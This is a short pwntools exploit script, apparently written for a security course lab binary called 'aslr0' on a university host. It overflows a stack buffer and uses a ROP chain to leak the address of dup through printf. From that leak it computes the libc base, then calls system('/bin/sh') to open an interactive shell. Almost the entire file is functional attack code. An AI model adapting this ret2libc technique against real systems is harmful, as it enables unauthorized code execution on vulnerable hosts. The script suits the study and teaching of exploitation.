#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template aslr0
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'aslr0')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('lettieri.iet.unipi.it', 4440)
    else:
        return remote('localhost', 4440)
    
# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'

io = start()

pop_rdi = 0x0040157b
nop = 0x0040158c

payload = flat({
    56 : [
        pop_rdi,
        exe.got['dup'],
        nop,
        exe.plt['printf'],
        # not necessary but make the program not fail
        exe.sym['child'],
    ]
})

io.send(payload)

# recv until wasn't working cause of buffering
x = io.recv(len(payload))

dup_leak = io.recv(8)
dup_leak = dup_leak.ljust(8, b'\x00')
dup_leak = u64(dup_leak)

libc.address = dup_leak - libc.sym['dup']

io.send(flat({
    56 : [
        pop_rdi,
        next(libc.search(b'/bin/sh\x00')),
        libc.sym['system'],
    ]
}))


io.interactive()

